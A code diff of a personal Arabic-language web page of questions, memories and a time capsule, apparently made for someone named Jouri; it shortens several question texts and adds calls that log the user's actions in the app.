                 renderPreviews();
                 document.getElementById('imageNote').value = "";
                 incrementFeelingsBadge();
+                logActivity(`أرسلت ${successCount} ملف`, 'مهم');
             } else {
                 status.innerText = `تم إرسال ${successCount}`;
                 status.style.color = '#fbbf24';
@@ -2247,7 +2425,7 @@
             { section: 'details', text: 'وش عطرك المفضل' },
             { section: 'details', text: 'وش فصل السنة اللي تحبه أكثر' },
             { section: 'details', text: 'وش وقتك المفضل باليوم' },
-            { section: 'details', text: 'وش جوك المفضل، المطر والبرد ولا الشمس والحر' },
+            { section: 'details', text: 'وش جوك المفضل' },
             { section: 'details', text: 'وش حيوانك المفضل' },
             { section: 'details', text: 'وش رقمك المفضل' },
             { section: 'details', text: 'وش حرفك المفضل' },
@@ -2310,7 +2488,7 @@
             { section: 'dreams', text: 'لو عندك يوم فاضي، كيف بتقضيه' },
             { section: 'dreams', text: 'وش الوظيفة اللي تتمناها' },
             { section: 'dreams', text: 'وش أكبر هدف تحاول تحققه' },
-            { section: 'dreams', text: 'لو صار معك مبلغ كبير فجأة، وش أول شيء' },
+            { section: 'dreams', text: 'لو صار معك مبلغ كبير فجأة' },
             { section: 'dreams', text: 'لو تعيش بأي دولة، وين تختار' },
             { section: 'dreams', text: 'وش الشيء اللي ودك تجربه مرة' },
             { section: 'dreams', text: 'لو تقابل شخصية مشهورة، مين' },
@@ -2345,7 +2523,7 @@
             { section: 'relations', text: 'وش تصرف يثبت إن الشخص يهتم' },
             { section: 'relations', text: 'الصديق اللي يشبهك ولا يكملك' },
             { section: 'relations', text: 'وش مستحيل تسامح عليه بصداقة' },
-            { section: 'relations', text: 'إذا تغير عليك شخص تحبه، تسأله ولا تبتعد' },
+            { section: 'relations', text: 'إذا تغير عليك شخص تحبه' },
             { section: 'relations', text: 'علاقات قليلة عميقة ولا كثيرة' },
             { section: 'relations', text: 'وش يجرحك من القريبين' },
             { section: 'relations', text: 'تعطي فرص ثانية بسهولة' },
@@ -2408,9 +2586,8 @@
         let allAnswers = {};
 
         function loadAllAnswers() {
-            try {
-                allAnswers = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
-            } catch(e) { allAnswers = {}; }
+            try { allAnswers = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); }
+            catch(e) { allAnswers = {}; }
         }
 
         function saveAnswer(index, value) {
@@ -2451,7 +2628,6 @@
                 const sectionQuestions = sections[sectionKey].filter(q => {
                     return !currentSearch || q.text.includes(currentSearch);
                 });
-
                 if (!sectionQuestions.length) return;
                 if (currentFilter !== 'all' && currentFilter !== sectionKey) return;
 
@@ -2513,7 +2689,6 @@
                 showToast('ما جاوبتي على أي سؤال', 'error');
                 return;
             }
-
             const button = event ? event.target : null;
             const originalText = button ? button.innerText : '';
             if (button) { button.disabled = true; button.innerText = 'جاري الإرسال...'; }
@@ -2529,7 +2704,6 @@
                 const q = questionsData[idx];
                 const answer = allAnswers[idx].trim();
                 const line = `**${Number(idx) + 1}. ${q.text}**\n${answer}\n\n`;
-
                 if ((currentChunk + line).length > 1900) {
                     chunks.push(currentChunk);
                     currentChunk = `**إجابات جوري (تكملة):**\n\n` + line;
@@ -2553,6 +2727,7 @@
             if (success === chunks.length) {
                 showToast(`تم إرسال ${answeredCount} إجابة`, "success");
                 incrementFeelingsBadge();
+                logActivity(`أرسلت ${answeredCount} إجابة`, 'مهم');
             } else {
                 showToast(`تم إرسال ${success} من ${chunks.length}`, "error");
             }
@@ -2571,6 +2746,9 @@
         renderQuestions();
         updateProgress();
 
+        // ============================================================
+        // الذكريات
+        // ============================================================
         function toggleMemory(el, event) {
             const checkbox = el.querySelector('.memory-check');
             if (!(event && event.target === checkbox)) {
@@ -2579,6 +2757,12 @@
             el.classList.toggle('done', checkbox.checked);
             saveMemoryState();
             updateMemoryProgress();
+            const memText = el.querySelector('.memory-text').innerText;
+            if (checkbox.checked) {
+                logActivity(`حددت ذكرى: ${memText}`, 'ذكريات');
+            } else {
+                logActivity(`ألغت تحديد ذكرى: ${memText}`, 'ذكريات');
+            }
         }
 
         function saveMemoryState() {
@@ -2618,6 +2802,7 @@
                 document.getElementById('capsuleMessage').value = "";
                 document.getElementById('capsuleCount').innerText = "0 حرف";
                 showToast("تم الحفظ", "success");
+                logActivity('حفظت كبسولة وقت', 'مهم');
             } else showToast("تعذر", "error");
         }
 
@@ -2648,6 +2833,7 @@
                 showToast("تم الإرسال", "success");
                 document.getElementById('dailyAnswer').value = "";
                 incrementFeelingsBadge();
+                logActivity('أرسلت إجابة سؤال اليوم', 'مهم');
             } else showToast("تعذر", "error");
         }
 
@@ -2663,8 +2849,12 @@
             const remainingDays = days % 30;
             res.style.display = "block";
             res.innerHTML = `بين التاريخين:<br>${days} يوم<br>≈ ${years} سنة و ${months} شهر و ${remainingDays} يوم`;
+            logActivity(`استخدمت حاسبة الأيام (${days} يوم)`, 'تفاعل');
         }
 
+        // ============================================================
+        // الجزيئات
+        // ============================================================
         const canvas = document.getElementById('particleCanvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
